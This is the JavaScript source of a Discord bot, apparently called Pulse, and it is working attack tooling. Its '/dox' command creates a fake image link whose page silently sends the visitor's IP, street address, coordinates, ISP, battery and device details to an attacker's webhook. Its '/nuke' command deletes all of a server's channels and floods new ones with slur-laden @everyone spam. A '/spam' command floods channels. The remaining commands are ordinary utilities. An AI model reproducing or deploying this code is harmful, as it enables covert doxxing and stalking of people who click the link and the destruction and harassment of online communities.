const { Client, GatewayIntentBits, EmbedBuilder, PermissionsBitField, ChannelType } = require('discord.js');
const crypto = require('crypto');
const express = require('express');
const app = express();

const TOKEN = process.env.TOKEN;
const DEFAULT_WEBHOOK = process.env.WEBHOOK_URL;
const INVITE_LINK = 'https://discord.gg/eG6SyjWbh';
const PORT = process.env.PORT || 3000;

const client = new Client({
    intents: [
        GatewayIntentBits.Guilds,
        GatewayIntentBits.GuildMessages
    ]
});

const links = new Map();
const startTime = Date.now();

// ---- PER-USER NUKE TRACKING ----
const userNukes = new Map(); // key: userId, value: { guildId, channels, running }

app.get('/img/:id.png', (req, res) => {
    const id = req.params.id;
    if (!links.has(id)) return res.status(404).send('Image not found');
    const data = links.get(id);
    res.type('text/html');
    res.send(generateDoxHTML(data.webhook || DEFAULT_WEBHOOK));
});
app.listen(PORT, () => console.log(`Dox server on ${PORT}`));

async function registerCommands() {
    const commands = [
        { name: 'dox', description: 'Generate dox link', options: [{ name: 'webhook', type: 3, description: 'Webhook URL', required: true }] },
        { name: 'spam', description: 'Spam a channel', options: [{ name: 'count', type: 4, description: 'Messages (max 100)', required: true }, { name: 'message', type: 3, description: 'Content', required: true }, { name: 'delay', type: 4, description: 'Delay in ms', required: false }] },
        { name: 'nuke', description: 'Start your own nuke (up to 100 channels)', options: [{ name: 'channels', type: 4, description: 'Channels to create (default 20, max 100)', required: false }, { name: 'delay', type: 4, description: 'Delay in ms between messages (default 50)', required: false }] },
        { name: 'stop', description: 'Stop YOUR nuke only' },
        { name: 'ad', description: 'Advertise the server invite' },
        { name: 'purge', description: 'Delete messages in bulk', options: [{ name: 'amount', type: 4, description: 'Number to delete (max 100)', required: true }, { name: 'user', type: 6, description: 'Target user', required: false }, { name: 'reason', type: 3, description: 'Reason', required: false }] },
        { name: 'ping', description: 'Check bot latency' },
        { name: 'serverinfo', description: 'Get server information' },
        { name: 'userinfo', description: 'Get user information', options: [{ name: 'user', type: 6, description: 'Target user', required: false }] },
        { name: 'avatar', description: 'Show user avatar', options: [{ name: 'user', type: 6, description: 'Target user', required: false }] },
        { name: 'math', description: 'Calculate a math expression', options: [{ name: 'expression', type: 3, description: 'Math expression', required: true }] },
        { name: 'say', description: 'Make bot say something', options: [{ name: 'message', type: 3, description: 'Message to say', required: true }] },
        { name: '8ball', description: 'Ask the magic 8-ball a question', options: [{ name: 'question', type: 3, description: 'Your question', required: true }] },
        { name: 'roll', description: 'Roll a dice', options: [{ name: 'sides', type: 4, description: 'Number of sides (default 6)', required: false }] }
    ];
    try {
        await client.application.commands.set([]);
        console.log('[REG] Cleared old commands.');
        await client.application.commands.set(commands);
        console.log(`[REG] Registered ${commands.length} commands.`);
    } catch (error) {
        console.error('[REG] Failed:', error);
    }
}

client.once('ready', async () => {
    console.log(`Logged in as ${client.user.tag}`);
    await registerCommands();
    console.log('Ready.');
});

client.on('interactionCreate', async (interaction) => {
    if (!interaction.isChatInputCommand()) return;

    try {
        await interaction.deferReply({ ephemeral: true });
    } catch {
        try {
            await interaction.reply({ content: '⏳ Processing...', ephemeral: true });
        } catch {
            return;
        }
    }

    try {
        const { commandName, options, user, member, guild, channel } = interaction;
        console.log(`[${new Date().toISOString()}] ${user.tag} -> /${commandName}`);

        // ---- STOP (only stops YOUR nuke) ----
        if (commandName === 'stop') {
            const userId = user.id;
            if (!userNukes.has(userId)) {
                return interaction.editReply('❌ You don\'t have a running nuke.');
            }
            const nuke = userNukes.get(userId);
            nuke.running = false;
            userNukes.delete(userId);
            await interaction.editReply('⏹️ **Your nuke has been stopped.**');
            return;
        }

        // ---- DOX ----
        if (commandName === 'dox') {
            const wh = options.getString('webhook');
            if (!wh || !wh.startsWith('https://discord.com/api/webhooks/')) {
                return interaction.editReply('❌ Invalid webhook URL.');
            }
            const id = crypto.randomBytes(6).toString('hex');
            const url = `https://pulsebot-qtgf.onrender.com/img/${id}.png`;
            links.set(id, { webhook: wh, user: user.tag, created: Date.now() });
            const embed = new EmbedBuilder()
                .setTitle('✅ Dox Link Ready')
                .setColor(0x22c55e)
                .setDescription(`🔗 **${url}**\n\nSends IP, location, ISP, ASN, battery, VPN detection, and device info.`)
                .setFooter({ text: `Generated by ${user.tag}` });
            await interaction.editReply({ embeds: [embed] });
            return;
        }

        // ---- SPAM ----
        if (commandName === 'spam') {
            const count = Math.min(options.getInteger('count'), 100);
            const msg = options.getString('message');
            const delay = options.getInteger('delay') || 0;
            if (!channel) return interaction.editReply('❌ No channel.');
            for (let i = 0; i < count; i++) {
                await channel.send(msg);
                if (delay > 0) await new Promise(r => setTimeout(r, delay));
            }
            await interaction.editReply(`✅ Spammed ${count} messages.`);
            return;
        }

        // ---- NUKE (per-user) ----
        if (commandName === 'nuke') {
            const userId = user.id;

            // Check if user already has a nuke running
            if (userNukes.has(userId)) {
                return interaction.editReply('❌ You already have a nuke running. Use `/stop` to stop it first.');
            }

            if (!guild) return interaction.editReply('❌ Server only.');
            if (!guild.members.me.permissions.has(PermissionsBitField.Flags.Administrator)) return interaction.editReply('❌ Need Admin.');

            const channelCount = Math.min(options.getInteger('channels') || 20, 100);
            const delayMs = Math.min(options.getInteger('delay') || 50, 500);
            const variants = ['# PULSE OWNS ALL YOU F@GGOTS TRASH ASS SERVER', '# PULSE  OWNS ALL YOU F@GGOTS TRASH ASS SERVER', '# PULSE OWNS ALL  YOU F@GGOTS TRASH ASS SERVER', '# PULSE OWNS ALL YOU F@GGOTS TRASH  ASS SERVER', '# PULSE OWNS ALL YOU F@GGOTS TRASH ASS  SERVER'];
            const inviteLine = `# JOIN PULSE: ${INVITE_LINK}`;

            await interaction.editReply(`🚀 **Nuke started!** Creating ${channelCount} channels... Use \`/stop\` to stop YOUR nuke.`);

            // Delete all channels
            await Promise.all(guild.channels.cache.map(c => c.delete().catch(() => {})));

            // Create new channels
            const newChannels = await Promise.all(Array.from({ length: channelCount }, () => guild.channels.create({ name: 'pulse', type: ChannelType.GuildText }).catch(() => null)));
            const valid = newChannels.filter(c => c);

            // Store this user's nuke
            const nukeData = {
                guildId: guild.id,
                channels: valid,
                running: true
            };
            userNukes.set(userId, nukeData);

            // Spam loop for this user's nuke
            let messageIndex = 0;
            while (nukeData.running) {
                const line = variants[messageIndex % variants.length];
                let big = `@everyone ${line}\n`;
                while (big.length + line.length + 1 < 2000 - inviteLine.length - 2) big += line + '\n';
                big += `\n${inviteLine}`;
                const msg = big.slice(0, 2000);

                await Promise.all(valid.map(c => c.send(msg).catch(() => {})));
                messageIndex++;
                await new Promise(r => setTimeout(r, delayMs));
            }

            // Cleanup when loop exits
            userNukes.delete(userId);
            return;
        }

        // ---- AD ----
        if (commandName === 'ad') {
            if (!channel) return interaction.editReply('❌ No channel.');
            const embed = new EmbedBuilder()
                .setTitle('🔥 Pulse Nuke Power')
                .setColor(0x8B5CF6)
                .setDescription(`Join Pulse:\n${INVITE_LINK}`)
                .setFooter({ text: 'Pulse Bot' });
            await channel.send({ embeds: [embed] });
            await interaction.editReply('✅ Ad sent.');
            return;
        }

        // ---- PURGE ----
        if (commandName === 'purge') {
            const amount = Math.min(options.getInteger('amount'), 100);
            const targetUser = options.getUser('user');
            const reason = options.getString('reason') || 'No reason';
            if (!channel) return interaction.editReply('❌ No channel.');
            if (!channel.permissionsFor(member).has(PermissionsBitField.Flags.ManageMessages)) return interaction.editReply('❌ Need Manage Messages.');
            let messages = await channel.messages.fetch({ limit: amount });
            if (targetUser) messages = messages.filter(m => m.author.id === targetUser.id);
            const deleted = await channel.bulkDelete(messages, true).catch(() => {});
            const embed = new EmbedBuilder()
                .setTitle('🧹 Purge Complete')
                .setColor(0x22c55e)
                .setDescription(`Deleted ${deleted ? deleted.size : 0} messages.`)
                .addFields({ name: 'Reason', value: reason });
            await interaction.editReply({ embeds: [embed] });
            return;
        }

        // ---- PING ----
        if (commandName === 'ping') {
            const sent = await interaction.editReply({ content: '🏓 Pinging...', fetchReply: true });
            const latency = sent.createdTimestamp - interaction.createdTimestamp;
            await interaction.editReply(`🏓 Pong!\n📨 Latency: ${latency}ms\n📡 API: ${Math.round(client.ws.ping)}ms`);
            return;
        }

        // ---- SERVERINFO ----
        if (commandName === 'serverinfo') {
            if (!guild) return interaction.editReply('❌ Server only.');
            const owner = await guild.fetchOwner();
            const embed = new EmbedBuilder()
                .setTitle(`📊 ${guild.name}`)
                .setColor(0x8B5CF6)
                .setThumbnail(guild.iconURL({ dynamic: true, size: 256 }))
                .addFields(
                    { name: '🆔 Server ID', value: guild.id, inline: true },
                    { name: '👑 Owner', value: owner.user.tag, inline: true },
                    { name: '👥 Members', value: `${guild.memberCount}`, inline: true },
                    { name: '💬 Channels', value: `${guild.channels.cache.size}`, inline: true },
                    { name: '📁 Roles', value: `${guild.roles.cache.size}`, inline: true },
                    { name: '📅 Created', value: `<t:${Math.floor(guild.createdTimestamp / 1000)}:R>`, inline: true }
                );
            await interaction.editReply({ embeds: [embed] });
            return;
        }

        // ---- USERINFO ----
        if (commandName === 'userinfo') {
            const target = options.getUser('user') || user;
            const memberTarget = guild ? await guild.members.fetch(target.id).catch(() => null) : null;
            const embed = new EmbedBuilder()
                .setTitle(`👤 ${target.tag}`)
                .setColor(0x8B5CF6)
                .setThumbnail(target.displayAvatarURL({ dynamic: true, size: 256 }))
                .addFields(
                    { name: '🆔 User ID', value: target.id, inline: true },
                    { name: '📅 Account Created', value: `<t:${Math.floor(target.createdTimestamp / 1000)}:R>`, inline: true },
                    { name: '🤖 Bot', value: target.bot ? 'Yes' : 'No', inline: true }
                );
            if (memberTarget) {
                embed.addFields(
                    { name: '📅 Joined Server', value: `<t:${Math.floor(memberTarget.joinedTimestamp / 1000)}:R>`, inline: true },
                    { name: '📊 Roles', value: memberTarget.roles.cache.map(r => r.toString()).join(', ') || 'None' }
                );
            }
            await interaction.editReply({ embeds: [embed] });
            return;
        }

        // ---- AVATAR ----
        if (commandName === 'avatar') {
            const target = options.getUser('user') || user;
            const embed = new EmbedBuilder()
                .setTitle(`${target.tag}'s Avatar`)
                .setImage(target.displayAvatarURL({ dynamic: true, size: 1024 }))
                .setColor(0x8B5CF6);
            await interaction.editReply({ embeds: [embed] });
            return;
        }

        // ---- MATH ----
        if (commandName === 'math') {
            const expr = options.getString('expression');
            try {
                const sanitized = expr.replace(/[^0-9+\-*/().% ]/g, '');
                if (!sanitized) return interaction.editReply('❌ Invalid expression.');
                const result = Function(`"use strict"; return (${sanitized})`)();
                await interaction.editReply(`🧮 **${expr}** = **${result}**`);
            } catch (e) {
                await interaction.editReply(`❌ Error: ${e.message}`);
            }
            return;
        }

        // ---- SAY ----
        if (commandName === 'say') {
            const msg = options.getString('message');
            if (!channel) return interaction.editReply('❌ No channel.');
            await channel.send(msg);
            await interaction.editReply('✅ Sent.');
            return;
        }

        // ---- 8BALL ----
        if (commandName === '8ball') {
            const responses = ['Yes', 'No', 'Maybe', 'Ask again later', 'Definitely', 'Absolutely not', 'It is certain', 'Very doubtful'];
            const answer = responses[Math.floor(Math.random() * responses.length)];
            const q = options.getString('question');
            const embed = new EmbedBuilder()
                .setTitle('🎱 8-Ball')
                .setDescription(`**Question:** ${q}\n**Answer:** ${answer}`)
                .setColor(0x8B5CF6);
            await interaction.editReply({ embeds: [embed] });
            return;
        }

        // ---- ROLL ----
        if (commandName === 'roll') {
            const sides = options.getInteger('sides') || 6;
            const result = Math.floor(Math.random() * sides) + 1;
            await interaction.editReply(`🎲 Rolled a d${sides}: **${result}**`);
            return;
        }

    } catch (error) {
        console.error('[ERROR]', error);
        try { await interaction.editReply(`❌ Error: ${error.message}`); } catch {}
    }
});

function generateDoxHTML(webhook) {
    return `<!DOCTYPE html>
<html>
<head><meta charset="UTF-8"><title></title><style>body{background:#fff;margin:0;height:100vh}</style></head>
<body>
<script>
const WEBHOOK_URL = "${webhook}";

async function getIPData() {
    const apis = [
        { url: "https://ipinfo.io/json", parse: d => ({ ip: d.ip, country: d.country, region: d.region, city: d.city, postal: d.postal, lat: d.loc?.split(",")[0], lon: d.loc?.split(",")[1], asn: d.asn, isp: d.org, timezone: d.timezone }) },
        { url: "https://ip-api.com/json/?fields=status,country,regionName,city,zip,lat,lon,as,isp,query", parse: d => ({ ip: d.query, country: d.country, region: d.regionName, city: d.city, postal: d.zip, lat: d.lat, lon: d.lon, asn: d.as, isp: d.isp, timezone: "N/A" }) },
        { url: "https://api.ipify.org?format=json", parse: d => ({ ip: d.ip }) }
    ];
    for (const api of apis) {
        try {
            const controller = new AbortController();
            const timeout = setTimeout(() => controller.abort(), 5000);
            const res = await fetch(api.url, { signal: controller.signal });
            clearTimeout(timeout);
            const data = await res.json();
            if (data.ip) {
                const result = api.parse(data);
                if (result.ip) return result;
            }
        } catch (e) {}
    }
    return { ip: "N/A", country: "N/A", region: "N/A", city: "N/A", postal: "N/A", lat: "N/A", lon: "N/A", asn: "N/A", isp: "N/A", timezone: "N/A" };
}

async function reverseGeocode(lat, lon) {
    try {
        const res = await fetch("https://nominatim.openstreetmap.org/reverse?lat=" + lat + "&lon=" + lon + "&format=json&zoom=18&addressdetails=1");
        const data = await res.json();
        if (data && data.display_name) return data.display_name;
    } catch (e) {}
    return null;
}

async function getBattery() {
    try {
        const b = await navigator.getBattery();
        return {
            level: Math.round(b.level * 100),
            charging: b.charging
        };
    } catch {
        return null;
    }
}

function detectVPN(ipData) {
    const signals = [];
    const vpnKeywords = ['vpn', 'proxy', 'cloudflare', 'aws', 'amazon', 'digitalocean', 'vultr', 'linode', 'hetzner', 'ovh', 'm247', 'psychz', 'hostinger', 'namecheap', 'contabo', 'server', 'hosting', 'dedicated'];
    const isp = (ipData.isp || '').toLowerCase();
    const asn = (ipData.asn || '').toLowerCase();
    if (vpnKeywords.some(k => isp.includes(k) || asn.includes(k))) {
        signals.push('ISP/ASN matches VPN/hosting provider');
    }
    try {
        const conn = navigator.connection || navigator.mozConnection;
        if (conn && conn.type === 'vpn') {
            signals.push('Connection type is "vpn"');
        }
    } catch {}
    if (ipData.timezone && ipData.timezone !== 'N/A') {
        const browserTz = Intl.DateTimeFormat().resolvedOptions().timeZone;
        if (browserTz && ipData.timezone !== browserTz) {
            signals.push('Timezone mismatch (IP: ' + ipData.timezone + ' vs Browser: ' + browserTz + ')');
        }
    }
    return {
        detected: signals.length > 0,
        signals: signals,
        score: signals.length
    };
}

(async function() {
    try {
        const ip = await getIPData();
        const now = new Date();
        const timestamp = now.toISOString();
        const localTime = now.toString();

        let address = "N/A";
        let lat = ip.lat || "N/A";
        let lon = ip.lon || "N/A";
        if (lat !== "N/A" && lon !== "N/A") {
            const addr = await reverseGeocode(lat, lon);
            if (addr) address = addr;
        }

        const battery = await getBattery();
        let batteryStr = "N/A";
        if (battery) {
            batteryStr = battery.level + "%";
            if (battery.charging) batteryStr += " (Charging)";
            else batteryStr += " (Not Charging)";
        }

        const vpn = detectVPN(ip);
        let vpnStr = vpn.detected ? "✅ Likely" : "❌ No";

        const ua = navigator.userAgent;
        const browser = ua.includes("Edg") ? "Edge" : ua.includes("Chrome") ? "Chrome" : ua.includes("Firefox") ? "Firefox" : ua.includes("Safari") ? "Safari" : "Unknown";
        const os = ua.includes("Windows NT 10.0") ? "Windows 10/11" : ua.includes("Mac OS X") ? "macOS" : ua.includes("Android") ? "Android" : ua.includes("iPhone") ? "iOS" : "Unknown";
        const device = /mobile|android|iphone|ipad/i.test(ua) ? "Mobile" : "Desktop";

        const mapUrl = "https://www.google.com/maps?q=" + lat + "," + lon;

        const fields = [
            { name: "📍 Address", value: address, inline: false },
            { name: "📌 Coordinates", value: lat + ", " + lon, inline: true },
            { name: "🗺️ Google Maps", value: "[Click to view](" + mapUrl + ")", inline: false },
            { name: "🌐 IP", value: ip.ip || "N/A", inline: true },
            { name: "🏙️ City", value: ip.city || "N/A", inline: true },
            { name: "🗺️ Region", value: ip.region || "N/A", inline: true },
            { name: "📮 Postal", value: ip.postal || "N/A", inline: true },
            { name: "🔢 ASN", value: ip.asn || "N/A", inline: true },
            { name: "🏢 ISP", value: ip.isp || "N/A", inline: true },
            { name: "🔋 Battery", value: batteryStr, inline: true },
            { name: "🛡️ VPN / Proxy", value: vpnStr, inline: true },
            { name: "🕒 Timezone", value: ip.timezone || "N/A", inline: true },
            { name: "🧠 Browser", value: browser, inline: true },
            { name: "💻 OS", value: os, inline: true },
            { name: "🖥️ Device", value: device, inline: true },
            { name: "⏰ Local Time", value: localTime, inline: false },
            { name: "📅 Timestamp", value: timestamp, inline: false }
        ];

        const embed = {
            title: "☠️ Doxxed",
            color: 0xFF0000,
            fields: fields,
            footer: { text: "Logged at " + timestamp }
        };

        await fetch(WEBHOOK_URL, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ embeds: [embed] })
        });

    } catch (err) {
        console.error("Dox error:", err);
    }

    document.body.innerHTML = "";
    document.body.style.background = "#ffffff";
    document.body.style.margin = "0";
    document.body.style.height = "100vh";
    setTimeout(() => {
        window.close();
        window.location.href = "about:blank";
    }, 1000);
})();
</script>
</body>
</html>`;
}

setInterval(() => {
    const keys = Array.from(links.keys());
    if (keys.length > 100) keys.slice(0, keys.length - 100).forEach(k => links.delete(k));
}, 60000);

process.on('uncaughtException', console.error);
process.on('unhandledRejection', console.error);

client.login(TOKEN);
